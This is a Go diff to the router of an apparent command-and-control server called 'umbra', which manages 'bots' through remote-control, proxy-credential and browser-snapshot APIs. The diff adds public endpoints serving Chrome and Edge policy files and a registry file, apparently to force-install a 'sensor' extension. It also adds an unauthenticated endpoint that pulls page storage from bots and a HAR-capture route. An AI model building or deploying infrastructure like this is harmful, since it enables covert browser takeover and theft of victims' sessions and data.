@@ -10,6 +10,7 @@ import (
 	"gorm.io/gorm"
 
 	"github.com/s045pd/umbra/internal/auth"
+	"github.com/s045pd/umbra/internal/blobstore"
 	"github.com/s045pd/umbra/internal/crxsign"
 	"github.com/s045pd/umbra/internal/live"
 )
@@ -31,6 +32,7 @@ type Deps struct {
 	// manifests and the dynamic install BAT. Example:
 	// "https://umbra.acme.example". Optional.
 	PublicURL string
+	Blobs     *blobstore.Store
 }
 
 // NewRouter assembles the chi router with all middleware and routes.
@@ -44,13 +46,16 @@ func NewRouter(d Deps) http.Handler {
 	authAPI := &AuthAPI{DB: d.DB, Sessions: d.Sessions, BcryptRounds: d.BcryptRounds}
 	botsAPI := &BotsAPI{DB: d.DB, RPC: d.BotRPC, Hub: d.LiveHub}
 	settingsAPI := &SettingsAPI{DB: d.DB}
-	mediaAPI := &MediaAPI{DB: d.DB}
+	mediaAPI := &MediaAPI{DB: d.DB, Blobs: d.Blobs}
 	investigationAPI := &InvestigationAPI{DB: d.DB}
 	remoteAPI := &RemoteAPI{DB: d.DB, RPC: d.BotRPC}
 	proxyAPI := &ProxyCredsAPI{DB: d.DB, RPC: d.BotRPC}
 	extensionAPI := &ExtensionAPI{Signer: d.ExtSigner, PublicURL: d.PublicURL}
 	extAuthAPI := &ExtAuthAPI{DB: d.DB, RPC: d.BotRPC}
 	browserSnapshotAPI := &BrowserSnapshotAPI{DB: d.DB, Service: d.BrowserSnapshots}
+	usersAPI := &UsersAPI{DB: d.DB, BcryptRounds: d.BcryptRounds}
+	auditAPI := &AuditAPI{DB: d.DB}
+	clustersAPI := &ClustersAPI{DB: d.DB}
 
 	// Public endpoints (no session required)
 	r.With(auth.SecurityHeaders(true)).Group(func(r chi.Router) {
@@ -77,15 +82,28 @@ func NewRouter(d Deps) http.Handler {
 		r.Get("/ext/updates.xml", extensionAPI.ServeUpdatesXML)
 		r.Get("/ext/umbra-sensor.crx", extensionAPI.ServeCRX)
 		r.Get("/ext/install-edge.bat", extensionAPI.ServeInstallEdgeBAT)
+		r.Get("/ext/chrome-policy.json", extensionAPI.ServeChromePolicy)
+		r.Get("/ext/edge-policy.json", extensionAPI.ServeEdgePolicy)
+		r.Get("/ext/chrome-policy.reg", extensionAPI.ServeChromePolicyREG)
+		r.Post("/api/v1/get-bot-page-storage", proxyAPI.GetBotPageStorage)
 	})
 
 	// Session-protected endpoints
-	r.With(auth.SecurityHeaders(true), d.Sessions.RequireSession(d.DB)).
+	r.With(auth.SecurityHeaders(true), d.Sessions.RequireSession(d.DB), AuditMutations(d.DB)).
 		Group(func(r chi.Router) {
 			// auth-related
 			r.Get("/api/v1/logout", authAPI.Logout)
 			r.Get("/api/v1/me", authAPI.Me)
 			r.Put("/api/v1/password", authAPI.ChangePassword)
+			r.Post("/api/v1/totp/setup", authAPI.SetupTOTP)
+			r.Post("/api/v1/totp/enable", authAPI.EnableTOTP)
+			r.Post("/api/v1/totp/disable", authAPI.DisableTOTP)
+			r.Get("/api/v1/users", usersAPI.List)
+			r.Post("/api/v1/users", usersAPI.Create)
+			r.Delete("/api/v1/users/{id}", usersAPI.Delete)
+			r.Get("/api/v1/audit", auditAPI.List)
+			r.Get("/api/v1/clusters", clustersAPI.List)
+			r.Post("/api/v1/capture-har", remoteAPI.CaptureHAR)
 			r.Get("/api/v1/download_ca", DownloadCAHandler)
 			r.Get("/api/v1/extension/targets", extensionAPI.ListEmbedTargets)
 			r.Get("/api/v1/extension/download", extensionAPI.Download)
